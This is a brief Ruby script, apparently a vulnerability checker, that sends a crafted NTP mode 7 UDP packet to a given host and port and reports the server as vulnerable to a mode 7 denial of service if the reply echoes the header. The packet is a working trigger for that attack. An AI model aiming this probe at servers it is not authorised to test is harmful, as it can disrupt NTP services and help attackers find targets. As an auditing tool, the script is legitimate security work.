require 'socket'
TIMEOUT = 5 

def main	
	url = ARGV[0]
	puerto = ARGV[1]

	socket = nil
	response = nil

	begin
		cadena_de_prueba = "\x97\x00\x00\x00\xAA\x00\x00\x00"
		socket = UDPSocket.open
		socket.send(cadena_de_prueba, 0, url, puerto)
		if select([socket], nil, nil, TIMEOUT)
			response = socket.recvfrom(10)
		end
	rescue 
		puts "No se pudo realizar el ataque"
	ensure
		socket.close if(socket)
	end
	
	if(response && response[0].index("\x97\x00\x00\x00"))
		puts "[+] Vulnerable a ataques NTP Mode 7 Request Denial Of Service"
	else
		puts "[-] No vulnerable a NTP Mode 7 Request Denial Of Service"
	end
end


main()